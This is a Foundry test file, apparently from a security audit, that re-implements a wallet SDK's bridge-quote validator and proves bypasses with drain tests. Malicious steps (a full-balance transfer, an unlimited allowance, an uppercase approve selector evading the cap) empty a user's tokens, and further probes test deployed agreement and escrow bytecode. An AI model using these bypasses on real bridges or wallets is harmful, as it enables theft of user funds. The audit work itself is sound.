// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Mocks.sol";

// ROUND 23 — Tim A (Major). Priority 1: bridge checkBridge lead (K-1515/K-1575,
// round 22, mechanism confirmed 3x by code reading, PoC node runners blocked
// 2x and NOT retried per round-7 rule).
//
// PROOF PATH (forge only, no node runner): this file re-implements checkBridge
// EXACTLY as written in the live SDK f450d44d (sdk-live.mjs lines 81-99) as a
// Solidity function over the same inputs (quote steps as hex-string calldata,
// same recipient/chainId/from/to/value checks, same case-sensitive
// startsWith("0x095ea7b3") approve branch), then executes the steps that pass
// the check verbatim from the user's account — mirroring bridge.send()
// (sdk-live.mjs lines 606-617: checkBridge(q, req), then
// sendTransaction({to, data, value: 0n}) per step).
//
// FIDELITY NOTES (read from the live SDK, 21 Nov 22:45 WIB, sha f450d44d):
//  - low(x) = String(x).toLowerCase() (line 42); bad(m) throws (line 43).
//  - The approve branch tests data.startsWith("0x095ea7b3") on the RAW hex
//    STRING (line 93) — case-sensitive. low() is applied to addresses, NEVER
//    to data. An uppercase-selector approve ("0x095EA7B3...") therefore skips
//    the branch entirely. In Solidity the model keeps data as a STRING for
//    the check and decodes it to bytes only for execution — exactly the
//    layer where the case distinction lives.
//  - `to` check (line 89) is a FORMAT regex /^0x[0-9a-fA-F]{40}$/ — any
//    well-formed address passes, including address(0) and arbitrary
//    contracts. There is NO allowlist of step targets. In the model `to` is
//    typed address, so the regex is trivially satisfied; address(0) in the
//    model stands for the JS "missing/empty to" case only (K-1617 documents
//    the format-only nature with arbitrary-target steps).
//  - `t.from` absent (line 88: `if (t.from && ...)`) skips the from-check;
//    relayToBull defaults a missing from to req.user (line 114). Model:
//    from == address(0) skips the check.
//  - Amount cap (line 95): data must be exactly 138 chars ("0x"+136) and
//    uint256(hex chars [74,138)) <= req.raw.
//  - bridge.send() forces value: 0n (line 613) but passes to/data verbatim.
//  - The controls K-1609..K-1616/K-1618 (every enforced check rejecting)
//    validate the model against the JS spec: if the model rejected something
//    JS accepts (or vice versa), a control would fail.
//
// PART 2 (K-1622..K-1626): Base carry-over proofs the round-22 OBS K-1601
// left unproven — kind-5 / panel / token_price_trigger on the LIVE Base
// Agreement bytecode (base-agree-zerofee.hex, feeSigner->0), plus Base
// escrow claimTo(address,address) dormancy probe and the 0x2591a130 WATCH.

struct BStep { uint256 chainId; address from; address to; uint256 value; string data; }
struct BQuote { address recipient; uint256 toChainId; BStep[] steps; }
struct BReq { address user; uint256 fromChainId; string fromName; address fromToken; uint256 raw; uint256 toChainId; }

/// Faithful Solidity re-implementation of checkBridge (SDK f450, lines 81-99).
/// send() executes each step pranked as req.user — exactly as the real
/// bridge.send() sends the transactions FROM the user's wallet.
contract BridgeModel is Test {
    function check(BQuote memory q, BReq memory req) public pure returns (bool) {
        if (q.steps.length == 0 || q.steps.length > 4)
            revert("the bridge quote has no usable steps.");
        if (q.recipient != address(0) && q.recipient != req.user)
            revert("the bridge recipient is not your own address.");
        if (q.toChainId != req.toChainId)
            revert("the bridge pays out on another chain than you asked for.");
        for (uint256 i = 0; i < q.steps.length; i++) {
            BStep memory t = q.steps[i];
            if (t.chainId != req.fromChainId)
                revert(string.concat("a bridge step is not for ", req.fromName, " (", _toString(req.fromChainId), ")."));
            if (t.from != address(0) && t.from != req.user)
                revert("a bridge step is sent from another address than yours.");
            if (t.to == address(0))
                revert("a bridge step has no valid target.");
            if (t.value != 0)
                revert("a bridge step sends native coin. A stablecoin bridge never needs that.");
            bytes memory d = bytes(t.data);
            if (!_isValidHexData(d))
                revert("a bridge step has invalid calldata.");
            if (_startsWithApprove(d)) {
                if (t.to != req.fromToken)
                    revert("a bridge approval is on another token than the one you bridge.");
                if (d.length != 138 || _approveAmount(d) > req.raw)
                    revert("a bridge approval is malformed or for more than the amount you bridge.");
            }
        }
        return true;
    }

    /// Mirrors bridge.send(): check first, then execute each step verbatim
    /// from the user's account with value 0.
    function send(BQuote memory q, BReq memory req) public returns (bool) {
        require(check(q, req), "check failed");
        for (uint256 i = 0; i < q.steps.length; i++) {
            BStep memory t = q.steps[i];
            bytes memory cd = _hexToBytes(t.data);
            vm.prank(req.user);
            (bool ok,) = t.to.call(cd);
            require(ok, "bridge step execution reverted");
        }
        return true;
    }

    function _isValidHexData(bytes memory d) internal pure returns (bool) {
        if (d.length < 2 || d[0] != "0" || d[1] != "x") return false;
        if ((d.length - 2) % 2 != 0) return false;
        for (uint256 i = 2; i < d.length; i++) {
            bytes1 c = d[i];
            bool ok = (c >= "0" && c <= "9") || (c >= "a" && c <= "f") || (c >= "A" && c <= "F");
            if (!ok) return false;
        }
        return true;
    }

    /// Case-sensitive: exactly "0x095ea7b3" (lowercase), as in the JS.
    function _startsWithApprove(bytes memory d) internal pure returns (bool) {
        if (d.length < 10) return false;
        bytes memory p = bytes("0x095ea7b3");
        for (uint256 i = 0; i < 10; i++) if (d[i] != p[i]) return false;
        return true;
    }

    /// JS: BigInt("0x" + data.slice(74, 138)) — 64 hex chars = amount.
    function _approveAmount(bytes memory d) internal pure returns (uint256 amt) {
        for (uint256 i = 74; i < 138; i++) amt = amt * 16 + _hexVal(d[i]);
    }

    function _toString(uint256 v) internal pure returns (string memory) {
        if (v == 0) return "0";
        uint256 len;
        uint256 x = v;
        while (x > 0) { len++; x /= 10; }
        bytes memory out = new bytes(len);
        while (v > 0) { out[--len] = bytes1(uint8(48 + (v % 10))); v /= 10; }
        return string(out);
    }

    function _hexVal(bytes1 c) internal pure returns (uint256) {
        if (c >= "0" && c <= "9") return uint8(c) - 48;
        if (c >= "a" && c <= "f") return uint8(c) - 87;
        return uint8(c) - 55; // A-F
    }

    function _hexToBytes(string memory s) public pure returns (bytes memory out) {
        bytes memory d = bytes(s);
        require(d.length >= 2 && d[0] == "0" && d[1] == "x", "not hex");
        out = new bytes((d.length - 2) / 2);
        for (uint256 i = 0; i < out.length; i++) {
            out[i] = bytes1(uint8(_hexVal(d[2 + 2 * i]) * 16 + _hexVal(d[3 + 2 * i])));
        }
    }
}

contract Round23ATest is Test {
    address constant AGMT_BASE = 0x81d4a3A3B4cDd43C32B14949A15521b4CE7A1391;
    address constant ESC_BASE = 0x22b6bd2b101959c970130ccF6738981925419687;

    BridgeModel model;
    MockERC20 usdc;   // bridged token (stands in for Base USDC 0x8335...)
    MockERC20 other;  // arbitrary token the user holds (NOT the bridged one)
    address user; address attacker; address relay; address stranger;
    BReq req;

    bytes4 constant SEL_ATTEST = 0xa3bb24cc;
    bytes4 constant SEL_VOTE = 0xb384abef;
    bytes4 constant SEL_RELEASE = 0x37bdc99b;

    struct Cond { uint8 kind; address target; bytes data; uint256 value; }
    struct Params { address payee; address asset; uint256 amount; uint64 expiry; bytes32 termsHash; Cond[] conditions; }
    struct Quote { uint256 feeWei; uint64 expiry; bytes sig; }

    uint256 constant USER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant PAYEE_PK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    uint256 constant ARB_PK = 0x47e179ec1974f892c2cd3b0cf1a4ec6a36e72a0a0d26ccaa2aa5c8ad6b9b47a8;
    address payer; address payee; address arbiter;
    MockERC20 token;

    function setUp() public {
        vm.chainId(4663);
        model = new BridgeModel();
        user = vm.addr(USER_PK);
        attacker = vm.addr(0xA77A);
        relay = address(0xBEEF);
        stranger = vm.addr(0x9999);
        usdc = new MockERC20();
        other = new MockERC20();
        usdc.mint(user, 25 ether);
        other.mint(user, 1000 ether);
        vm.deal(user, 10 ether);
        // bridge base -> robinhood, amount "25" => raw 25e6 (6 decimals).
        // Use raw in the mock token's 18-decimal units for readability:
        // raw = 25 ether of `usdc` here.
        req = BReq({ user: user, fromChainId: 8453, fromName: "Base", fromToken: address(usdc), raw: 25 ether, toChainId: 4663 });

        // --- Base agreement harness (Part 2) ---
        payer = vm.addr(USER_PK);
        payee = vm.addr(PAYEE_PK);
        arbiter = vm.addr(ARB_PK);
        vm.etch(AGMT_BASE, vm.parseBytes(vm.readFile("bytecode/base-agree-zerofee.hex")));
        vm.etch(ESC_BASE, vm.parseBytes(vm.readFile("bytecode/base-esc-zerofee.hex")));
        vm.store(AGMT_BASE, bytes32(uint256(0)), bytes32(uint256(1)));
        vm.store(AGMT_BASE, bytes32(uint256(11)), bytes32(uint256(1)));
        token = new MockERC20();
        token.mint(payer, 100000 ether);
        vm.deal(payer, 100 ether);
        vm.deal(payee, 10 ether);
        vm.deal(arbiter, 10 ether);
        vm.deal(stranger, 10 ether);
        vm.warp(1000);
    }

    // ---------- hex helpers (test side) ----------
    function _toHex(bytes memory b) internal pure returns (string memory) {
        bytes memory alpha = "0123456789abcdef";
        bytes memory out = new bytes(2 + b.length * 2);
        out[0] = "0"; out[1] = "x";
        for (uint256 i = 0; i < b.length; i++) {
            out[2 + 2 * i] = alpha[uint8(b[i]) >> 4];
            out[3 + 2 * i] = alpha[uint8(b[i]) & 0x0f];
        }
        return string(out);
    }
    function _toHexNoPrefix(bytes memory b) internal pure returns (string memory) {
        bytes memory alpha = "0123456789abcdef";
        bytes memory out = new bytes(b.length * 2);
        for (uint256 i = 0; i < b.length; i++) {
            out[2 * i] = alpha[uint8(b[i]) >> 4];
            out[2 * i + 1] = alpha[uint8(b[i]) & 0x0f];
        }
        return string(out);
    }
    function _transferData(address to, uint256 amt) internal pure returns (string memory) {
        return _toHex(abi.encodeWithSelector(bytes4(0xa9059cbb), to, amt));
    }
    function _transferFromData(address from, address to, uint256 amt) internal pure returns (string memory) {
        return _toHex(abi.encodeWithSelector(bytes4(0x23b872dd), from, to, amt));
    }
    function _increaseAllowanceData(address sp, uint256 amt) internal pure returns (string memory) {
        return _toHex(abi.encodeWithSelector(bytes4(0x39509351), sp, amt));
    }
    function _approveData(address sp, uint256 amt) internal pure returns (string memory) {
        return _toHex(abi.encodeWithSelector(bytes4(0x095ea7b3), sp, amt));
    }

    function _quote(BStep[] memory steps) internal view returns (BQuote memory) {
        return BQuote({ recipient: user, toChainId: 4663, steps: steps });
    }
    function _step(address to, string memory data) internal view returns (BStep memory) {
        return BStep({ chainId: 8453, from: user, to: to, value: 0, data: data });
    }

    // ---- K-1605 (PASS candidate): transfer(attacker, FULL balance) on an
    // arbitrary token passes checkBridge and drains the user. ----
    function testK1605_TransferStepDrainsUser() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(other), _transferData(attacker, 1000 ether));
        BQuote memory q = _quote(steps);
        bool ok = model.check(q, req);
        require(ok, "K-1605 checkBridge must PASS the transfer step");
        model.send(q, req);
        emit log_named_uint("K-1605 attacker other-balance", other.balanceOf(attacker));
        emit log_named_uint("K-1605 user other-balance", other.balanceOf(user));
        require(other.balanceOf(attacker) == 1000 ether, "K-1605 attacker must receive full balance");
        require(other.balanceOf(user) == 0, "K-1605 user must be drained");
    }

    // ---- K-1606: increaseAllowance(attacker, max) passes, then attacker
    // drains via transferFrom. Same root cause -> FOLD to B-42. ----
    function testK1606_IncreaseAllowanceDrainsUser() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(other), _increaseAllowanceData(attacker, type(uint256).max));
        BQuote memory q = _quote(steps);
        require(model.check(q, req), "K-1606 checkBridge must PASS the increaseAllowance step");
        model.send(q, req);
        require(other.allowance(user, attacker) == type(uint256).max, "K-1606 allowance must be max");
        vm.prank(attacker);
        other.transferFrom(user, attacker, 1000 ether);
        require(other.balanceOf(attacker) == 1000 ether, "K-1606 attacker must drain via allowance");
    }

    // ---- K-1607: UPPERCASE approve selector 0x095EA7B3 skips the approve
    // branch (case-sensitive startsWith) — wrong token + 10x raw passes,
    // and the decoded bytes ARE a valid approve. FOLD to B-42. ----
    function testK1607_UppercaseApproveBypassesCap() public {
        string memory dataHex = string.concat("0x095EA7B3", _toHexNoPrefix(abi.encode(attacker, 250 ether)));
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(other), dataHex);
        BQuote memory q = _quote(steps);
        require(model.check(q, req), "K-1607 checkBridge must PASS the uppercase approve");
        model.send(q, req);
        emit log_named_uint("K-1607 allowance on wrong token", other.allowance(user, attacker));
        require(other.allowance(user, attacker) == 250 ether, "K-1607 attacker must hold 250 allowance on the wrong token");
        vm.prank(attacker);
        other.transferFrom(user, attacker, 250 ether);
        require(other.balanceOf(attacker) == 250 ether, "K-1607 attacker must drain 250 via the bypassed approval");
    }

    // ---- K-1608 control: legit lowercase approve, right token, amount==raw ----
    function testK1608_LegitApprovePasses() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(usdc), _approveData(relay, 25 ether));
        BQuote memory q = _quote(steps);
        require(model.check(q, req), "K-1608 legit approve must pass");
        model.send(q, req);
        require(usdc.allowance(user, relay) == 25 ether, "K-1608 relay allowance must be raw");
    }

    // ---- K-1609 control: approve amount raw+1 rejected ----
    function testK1609_ApproveOverCapRejected() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(usdc), _approveData(relay, 25 ether + 1));
        vm.expectRevert("a bridge approval is malformed or for more than the amount you bridge.");
        model.check(_quote(steps), req);
    }

    // ---- K-1610 control: approve on the wrong token rejected ----
    function testK1610_ApproveWrongTokenRejected() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(other), _approveData(relay, 25 ether));
        vm.expectRevert("a bridge approval is on another token than the one you bridge.");
        model.check(_quote(steps), req);
    }

    // ---- K-1611 control: value != 0 rejected ----
    function testK1611_NonzeroValueRejected() public {
        BStep memory s = _step(address(usdc), _approveData(relay, 25 ether));
        s.value = 1;
        BStep[] memory steps = new BStep[](1);
        steps[0] = s;
        vm.expectRevert("a bridge step sends native coin. A stablecoin bridge never needs that.");
        model.check(_quote(steps), req);
    }

    // ---- K-1612 control: from != user rejected ----
    function testK1612_WrongFromRejected() public {
        BStep memory s = _step(address(usdc), _approveData(relay, 25 ether));
        s.from = attacker;
        BStep[] memory steps = new BStep[](1);
        steps[0] = s;
        vm.expectRevert("a bridge step is sent from another address than yours.");
        model.check(_quote(steps), req);
    }

    // ---- K-1613 control: recipient != user rejected ----
    function testK1613_WrongRecipientRejected() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(usdc), _approveData(relay, 25 ether));
        BQuote memory q = _quote(steps);
        q.recipient = attacker;
        vm.expectRevert("the bridge recipient is not your own address.");
        model.check(q, req);
    }

    // ---- K-1614 control: 5 steps rejected ----
    function testK1614_FiveStepsRejected() public {
        BStep[] memory steps = new BStep[](5);
        for (uint256 i = 0; i < 5; i++) steps[i] = _step(address(usdc), _approveData(relay, 1 ether));
        vm.expectRevert("the bridge quote has no usable steps.");
        model.check(_quote(steps), req);
    }

    // ---- K-1615 control: to.chainId mismatch rejected ----
    function testK1615_WrongToChainRejected() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(usdc), _approveData(relay, 25 ether));
        BQuote memory q = _quote(steps);
        q.toChainId = 8453;
        vm.expectRevert("the bridge pays out on another chain than you asked for.");
        model.check(q, req);
    }

    // ---- K-1616 control: step chainId mismatch rejected ----
    function testK1616_WrongStepChainRejected() public {
        BStep memory s = _step(address(usdc), _approveData(relay, 25 ether));
        s.chainId = 4663;
        BStep[] memory steps = new BStep[](1);
        steps[0] = s;
        vm.expectRevert("a bridge step is not for Base (8453).");
        model.check(_quote(steps), req);
    }

    // ---- K-1617 OBS: the `to` check is format-only — a step to an arbitrary
    // contract/EOA with arbitrary valid calldata PASSES checkBridge. (JS
    // regex /^0x[0-9a-fA-F]{40}$/ accepts ANY 40-hex address, incl. 0x0 and
    // contracts that are not tokens; there is no allowlist.) ----
    function testK1617_ArbitraryTargetPassesCheck() public {
        BStep[] memory steps = new BStep[](2);
        steps[0] = _step(stranger, "0x12345678");
        steps[1] = _step(address(this), "0xdeadbeef");
        require(model.check(_quote(steps), req), "K-1617 arbitrary targets must pass the format-only to-check");
    }

    // ---- K-1618 control: invalid hex data rejected (non-hex chars / odd length) ----
    function testK1618_InvalidHexDataRejected() public {
        BStep[] memory steps = new BStep[](1);
        steps[0] = _step(address(usdc), "0xzz");
        vm.expectRevert("a bridge step has invalid calldata.");
        model.check(_quote(steps), req);
        BStep[] memory steps2 = new BStep[](1);
        steps2[0] = _step(address(usdc), "0x123");
        vm.expectRevert("a bridge step has invalid calldata.");
        model.check(_quote(steps2), req);
    }

    // ---------- Part 2: Base carry-over (was OBS K-1601) ----------
    function _create(address agmt, Cond[] memory conds, address _payee) internal returns (bool ok, bytes memory ret) {
        Params memory p = Params({ payee: _payee, asset: address(token), amount: 500 ether, expiry: uint64(block.timestamp + 30 days), termsHash: bytes32(0), conditions: conds });
        Quote memory q = Quote({ feeWei: 0, expiry: uint64(block.timestamp + 3600), sig: new bytes(65) });
        vm.prank(payer);
        (ok, ret) = agmt.call(abi.encodeWithSignature(
            "createAgreement((address,address,uint256,uint64,bytes32,(uint8,address,bytes,uint256)[]),(uint256,uint64,bytes))", p, q));
    }
    function _createDefault(address agmt, Cond[] memory conds) internal returns (bool ok, bytes memory ret) {
        vm.prank(payer);
        token.approve(agmt, 100000 ether);
        return _create(agmt, conds, payee);
    }
    function _call(address agmt, address who, bytes memory data) internal returns (bool ok, bytes memory ret) {
        vm.prank(who);
        (ok, ret) = agmt.call(data);
    }
    function _conds1(uint8 k1, address t1, bytes memory d1, uint256 v1) internal pure returns (Cond[] memory c) {
        c = new Cond[](1);
        c[0] = Cond({ kind: k1, target: t1, data: d1, value: v1 });
    }

    // ---- K-1622: kind-5 (optimistic value=24) still accepted on BASE ----
    // Shape copied from round-22C K-1586b (v4.1): single kind-5, target=payee.
    function testK1622_Kind5_BaseAgreement() public {
        vm.chainId(8453);
        Cond[] memory conds = _conds1(5, payee, "", 24);
        (bool ok,) = _createDefault(AGMT_BASE, conds);
        require(ok, "K-1622 base kind-5 create must succeed");
        uint256 before = token.balanceOf(payee);
        (bool rel,) = _call(AGMT_BASE, stranger, abi.encodeWithSelector(SEL_RELEASE, uint256(1)));
        require(rel, "K-1622 base kind-5 release must succeed immediately");
        require(token.balanceOf(payee) - before == 500 ether, "K-1622 base payee must gain 500");
    }

    // ---- K-1623: panel quorum [payee]/k=1 on BASE ----
    function testK1623_Panel_BaseAgreement() public {
        vm.chainId(8453);
        address[] memory voters = new address[](1);
        voters[0] = payee;
        Cond[] memory conds = _conds1(6, address(0), abi.encode(voters), 1);
        (bool ok,) = _createDefault(AGMT_BASE, conds);
        require(ok, "K-1623 base panel create must succeed");
        (bool v,) = _call(AGMT_BASE, payee, abi.encodeWithSelector(SEL_VOTE, uint256(1), uint256(0)));
        require(v, "K-1623 base vote must succeed");
        uint256 before = token.balanceOf(payee);
        (bool rel,) = _call(AGMT_BASE, stranger, abi.encodeWithSelector(SEL_RELEASE, uint256(1)));
        require(rel, "K-1623 base panel release must succeed");
        require(token.balanceOf(payee) - before == 500 ether, "K-1623 base payee must gain 500");
    }

    // ---- K-1624: token_price_trigger kind-1 self-attest on BASE ----
    function testK1624_TokenPriceTrigger_BaseAgreement() public {
        vm.chainId(8453);
        Cond[] memory conds = _conds1(1, payee, "", 0);
        (bool ok,) = _createDefault(AGMT_BASE, conds);
        require(ok, "K-1624 base kind-1 create must succeed");
        (bool att,) = _call(AGMT_BASE, payee, abi.encodeWithSelector(SEL_ATTEST, uint256(1), uint256(0)));
        require(att, "K-1624 base payee self-attest must succeed");
        uint256 before = token.balanceOf(payee);
        (bool rel,) = _call(AGMT_BASE, stranger, abi.encodeWithSelector(SEL_RELEASE, uint256(1)));
        require(rel, "K-1624 base release must succeed");
        require(token.balanceOf(payee) - before == 500 ether, "K-1624 base payee must gain 500");
    }

    // ---- K-1625 WATCH: 0x2591a130 getter on BASE (log-only, no assertion) ----
    function testK1625_Getter2591_BaseAgreement() public {
        vm.chainId(8453);
        bytes memory call1 = abi.encodeWithSelector(bytes4(0x2591a130), uint256(1), uint256(0));
        (bool r1, bytes memory ret1) = AGMT_BASE.staticcall(call1);
        emit log_named_uint("K-1625 base getter(1,0) ok", r1 ? 1 : 0);
        if (r1) emit log_named_bytes("K-1625 base getter(1,0) ret", ret1);
        else emit log_named_bytes("K-1625 base getter(1,0) revert", ret1);
    }

    // ---- K-1626: Base ESCROW claimTo(address,address) dormancy probe.
    // Sweep plausible owed-mapping slots 0..15: fabricate owed[payer]=0.5 ETH
    // at keccak(payer, s), fund escrow with ETH + tokens, call both arg
    // orders as payer. If ANY variant pays, the test FAILS (finding).
    // If all revert / pay nothing -> dormant, KILL. ----
    function testK1626_BaseEscrowClaimTo2Arg_Dormant() public {
        vm.deal(ESC_BASE, 10 ether);
        token.mint(ESC_BASE, 1000 ether);
        for (uint256 s = 0; s <= 15; s++) {
            bytes32 slot = keccak256(abi.encode(payer, s));
            vm.store(ESC_BASE, slot, bytes32(uint256(0.5 ether)));
            uint256 ethBefore = stranger.balance;
            uint256 tokBefore = token.balanceOf(stranger);
            (bool ok,) = _call(ESC_BASE, payer, abi.encodeWithSelector(bytes4(0x34a1ca89), payer, stranger));
            emit log_named_uint("K-1626 slot claimTo(payer,stranger) ok", s);
            emit log_named_uint("  ok", ok ? 1 : 0);
            require(!ok, "K-1626 claimTo(payer,stranger) must revert for every owed slot");
            require(stranger.balance == ethBefore && token.balanceOf(stranger) == tokBefore, "K-1626 stranger must gain nothing");
            vm.store(ESC_BASE, slot, bytes32(uint256(0)));
        }
        // asset-first reading: claimTo(token, payer) as payer
        bytes32 slotTok = keccak256(abi.encode(address(token), uint256(7)));
        vm.store(ESC_BASE, slotTok, bytes32(uint256(0.5 ether)));
        (bool ok2,) = _call(ESC_BASE, payer, abi.encodeWithSelector(bytes4(0x34a1ca89), address(token), payer));
        emit log_named_uint("K-1626 claimTo(token,payer) ok", ok2 ? 1 : 0);
        require(!ok2, "K-1626 claimTo(token,payer) must revert");
    }
}
